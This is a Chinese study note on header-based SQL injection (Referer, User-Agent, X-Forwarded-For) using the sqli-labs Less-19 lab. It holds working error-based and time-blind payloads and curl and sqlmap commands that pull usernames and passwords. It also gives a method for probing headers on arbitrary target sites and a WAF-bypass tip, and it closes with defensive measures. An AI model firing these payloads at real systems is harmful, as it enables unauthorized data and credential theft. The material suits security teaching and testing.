# 03-Refer 注入

> 前置：[[02-UA注入|UA 注入]]（两者代码同构，先读 UA 章理解 insert 闭合）
>
> sqli-labs 对照：less-19（Referer Injection）

## 一、注入点原理

less-19 与 less-18 唯一的区别：**写入日志表的值从 User-Agent 换成了 Referer 头**。漏洞代码原型：

```php
// 登录验证通过后
$uagent = $_SERVER['HTTP_REFERER'];
$IP = $_SERVER['REMOTE_ADDR'];
$insert = "INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";
mysql_query($insert);
```

Referer 是浏览器自动携带的"来源页"头，攻击者用代理可任意篡改。与 UA 章同理：

1. 必须先登录成功（靶场默认 `Dhakkan/dumb`）
2. insert 场景无结果集回显，主打报错注入

## 二、利用流程（less-19）

payload 构造与 [[02-UA注入|UA 注入]] 完全一致，只是换请求头字段：

```bash
# 1. 报错确认闭合
curl -s "http://127.0.0.1/sqli-labs/Less-19/" \
     -d "uname=Dhakkan&passwd=dumb&submit=Submit" \
     -H "Referer: ' and updatexml(1,concat(0x7e,database()),1) or '"
# XPATH syntax error: '~security'

# 2. 爆表
curl -s "http://127.0.0.1/sqli-labs/Less-19/" \
     -d "uname=Dhakkan&passwd=dumb" \
     -H "Referer: ' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) or '"

# 3. 爆数据
curl -s "http://127.0.0.1/sqli-labs/Less-19/" \
     -d "uname=Dhakkan&passwd=dumb" \
     -H "Referer: ' and updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,30)),1) or '"

# extractvalue 版本（回显更短，需分段）
curl -s "http://127.0.0.1/sqli-labs/Less-19/" \
     -d "uname=Dhakkan&passwd=dumb" \
     -H "Referer: ' and extractvalue(1,concat(0x7e,(select version()),0x7e)) and '"
```

Burp 操作：拦截登录请求 → Repeater 中加/改 `Referer` 头 → 逐条测试。

### 常用报错 payload 速查（header 位置通用）

```sql
' or updatexml(1,concat(0x7e,database()),1) or '                    -- 当前库
' or updatexml(1,concat(0x7e,version(),0x7e,user()),1) or '         -- 版本+用户
' or extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1))) or '
-- 32 字符限制: 超长结果用 limit 0,1 / 1,1 翻页或 substr 分段
```

## 三、与 UA 注入的同构性

| 对比项 | less-18 | less-19 |
|--------|---------|---------|
| 注入头 | User-Agent | Referer |
| 目标表 | uagents | referers |
| 触发条件 | 登录成功后 insert | 登录成功后 insert |
| payload | 完全相同 | 完全相同 |
| 主打技术 | 报错注入 | 报错注入 |

结论：**header 注入是一类问题，不是一个漏洞点**。服务端只要把任意 `$_SERVER['HTTP_*']` 拼进 SQL，打法都一样。

### 同构性的实战意义

1. **payload 库可复用**——在 UA 上验证过的闭合方式，直接搬到 Referer/XFF
2. **排查时成组测试**——发现一个头有注入，其余头大概率同代码风格，逐个验证即可批量收获
3. **审计时按类搜索**——源码里搜 `$_SERVER['HTTP_`，命中几处就审几处

## 四、XFF（X-Forwarded-For）完整示例

XFF 是 header 注入里出现频率最高的真实漏洞点——很多业务系统"记录访问者真实 IP"直接取 XFF 拼库：

```php
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];      // 可伪造！
$sql = "INSERT INTO access_log(ip, path) VALUES('$ip', '$path')";
```

利用流程：

```bash
# 1. 探测
curl -s "http://目标/login" -H "X-Forwarded-For: 1'"

# 2. 确认后报错提数据（payload 与 less-19 相同）
curl -s "http://目标/login" \
     -H "X-Forwarded-For: -1' or updatexml(1,concat(0x7e,database()),1) or '1"='1'

# 3. 无报错回显走时间盲注
curl -s -o /dev/null -w "%{time_total}\n" "http://目标/login" \
     -H "X-Forwarded-For: 1' and if(substr(database(),1,1)=115,sleep(5),0)#"
```

| 场景差异 | 说明 |
|---------|------|
| 服务端取第一段 | `X-Forwarded-For: 注入payload, 1.1.1.1` 第一段可控 |
| 服务端取最后一段 | 需控制链路末端，`..., 注入payload` |
| 存入 varchar(N) 截断 | payload 超长被截断，改用短 payload 或盲注 |

sqlmap 自动化：

```bash
sqlmap -u "http://目标/login" --data="user=a&pass=b" \
       --headers="X-Forwarded-For: *" --dbms=mysql --batch
# 头值中的 * 号标记注入点
```

## 四、header 注入点通用排查方法

拿到一个站点，按这张表逐个头排查（优先级从高到低）：

| 请求头 | 常见落点 | 排查方法 |
|--------|---------|---------|
| Cookie | 会话校验、个性化查询 | 改值加 `'` 看报错；base64 解码看内部结构（见 [[01-Cookie注入\|01-Cookie注入]]） |
| User-Agent | 访问日志、反爬统计、后台设备列表 | 登录前后各测一次；`'` 试探 + 报错/时间盲注 |
| Referer | 防盗链日志、来源统计表 | 同 UA；注意有些站只在特定路径记录 |
| X-Forwarded-For | IP 归属地记录、防刷限流表 | **XFF 可伪造真实 IP**，很多"按 IP 记录"功能直接拼 SQL；payload 用 `-1' or updatexml(1,concat(0x7e,database()),1) or '` |
| Accept-Language | 地域化内容查询 | 较少见，值形如 `zh-CN,zh;q=0.9`，可在分号后插 payload |
| X-Real-IP / Client-IP | 同 XFF 的变体 | 反代环境下与 XFF 二选一生效，都测 |
| 自定义头（X-Token 等） | API 网关鉴权、埋点系统 | 抓包观察哪些头被服务端处理过（响应中有映射的优先） |

> 提示：Accept-Language 的注入形态较少见，值形如 `zh-CN,zh;q=0.9`，payload 可插在分号后：`zh;q=0.9' and extractvalue(1,concat(0x7e,database()))#`。

排查三步法：

```bash
# 1. 全头加单引号试探（一次一个头）
curl -s "http://目标/" -H "X-Forwarded-For: 1'"

# 2. 有异常响应的头，做布尔/时间二次确认
curl -s -o /dev/null -w "%{time_total}\n" "http://目标/" \
     -H "X-Forwarded-For: 1' and sleep(5)#"
# 若响应约 5 秒 → 确认时间盲注

# 3. 有报错回显直接上 updatexml 提数据
curl -s "http://目标/" -H "X-Forwarded-For: 1' and updatexml(1,concat(0x7e,database()),1)#"
```

### 排查记录模板

| 头 | 试探结果 | 二次确认 | 结论 |
|----|---------|---------|------|
| Cookie | 500 报错 | updatexml 回显数据库名 | 可注入，单引号闭合 |
| User-Agent | 无差异 | sleep 无延迟 | 不落库或已参数化 |
| Referer | 页面异常 | 布尔差异存在 | 盲注候选 |
| XFF | 无反应 | — | 未使用 |

逐头留痕，避免重复劳动。

## 六、易错点

| 易错点 | 说明 |
|-------|------|
| 未登录就测 UA/Referer | less-18/19 必须先登录成功才走 insert 分支，未登录时怎么改头都没反应 |
| 只测 GET 首页 | header 日志常挂在特定动作（登录、下单）之后，要在对应业务路径上测 |
| 忽略大小写变形 | 有些 WAF 只拦 `User-Agent` 关键词，换成小写或加空格即可绕过检测层 |
| XFF 多级链 | `X-Forwarded-For: client, proxy1, proxy2` 服务端可能取第一段或最后一段，两段都试 |
| Referer 空值绕过 | 部分站只在 Referer 非空时记录，先随便给个合法来源页再注入 |

## 七、防御

| 措施 | 说明 |
|------|------|
| 参数化写入日志 | 所有 HTTP_* 值入 SQL 一律 prepared statement |
| 日志旁路化 | 访问日志交给 nginx/ELK 而不是写数据库，天然消除注入面 |
| 头部值规范化 | 截断长度、过滤控制字符后再入库 |
| 不回显原始错误 | 生产环境统一 500 页面，杜绝报错注入出口 |
| 纵深防御 | 数据库账号最小权限，日志表与业务表隔离 |

---
**返回** [[mysql结构总目录|mysql结构 总目录]]
